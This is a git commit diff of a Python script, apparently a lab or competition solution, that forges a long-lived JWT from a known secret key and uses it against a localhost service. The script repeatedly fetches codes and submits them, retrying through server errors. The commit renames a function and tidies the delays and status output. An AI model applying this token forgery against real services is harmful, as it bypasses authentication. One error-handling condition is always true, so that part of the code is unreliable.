fa43e5a5f0a9aea5647ad6b2d72ef5ef1c813768
dailin <2687008066@qq.com>
2024-09-12 13:26:31 +0800

    simplify

--- NMS_senior_final_1.0.py
+++ NMS_senior_final_1.0.py
@@ -4,6 +4,7 @@ signup_url = 'http://127.0.0.1:1323/signup'
 login_url="http://127.0.0.1:1323/login"
 info_url="http://127.0.0.1:1323/api/info"
 validate_url="http://127.0.0.1:1323/api/validate"
+beat_delay=5
 
 user_name = {'username': '111'}
 secret_key="11111111111111" 
@@ -32,7 +33,7 @@ def fake_token():
     print("fake a new token:"+token[:15])
 #（关键）上面是通过已知的密钥，伪造长时间有效token
 
-def get_code(token):
+def get_and_post_code(token):
     headers={
         "Authorization": "Bearer "+token 
     }
@@ -43,30 +44,31 @@ def get_code(token):
                 err=res["message"]
 
                 if err == "Internal Server Error":
-                    print(2)
-                    time.sleep(10)
+                    print("status:2")
+                    time.sleep(beat_delay)
                     continue
 
                 elif err == "Bad Gateway":
-                    print(3)
-                    time.sleep(10)
+                    print("status:3")
+                    time.sleep(beat_delay)
                     continue
             
                 elif err == "invalid or expired jwt" or "missing or malformed jwt":
-                    print(4)
-                    time.sleep(10)
+                    print("status:4")
+                    time.sleep(beat_delay)
                     continue
 
             else:    
                 code=res["code"]
                 print("get code:"+code)
-                return code
+                post_code(token,code)
+                break
         except Exception as e:
             if "Connection refused" in str(e):
-                print(1)
-                time.sleep(10)
+                print("status:1")
+                time.sleep(beat_delay)
                 continue
-#（关键）当服务器出现问题时，重复提交请求，保证获得code
+#（关键）当服务器出现问题时，重复提交请求，保证获得code,并且提交
 
 def post_code(token,code):
     headers={
@@ -88,13 +90,13 @@ for i in range(100):
     except Exception as err:
         print("try again...")
         if "Connection refused" in str(err):
-            err=1
+            err="status:1"
         print(err)
-        time.sleep(10)
+        time.sleep(beat_delay)
 #获得长时间有效token
 
-for i in range(15):
-    code=get_code(token)
-    post_code(token,code)
+for i in range(10):
+    get_and_post_code(token)
+    print(f"it is the {i+1} success!!!")
     time.sleep(30)
-#提交不同的code
+#提交10次不同的code
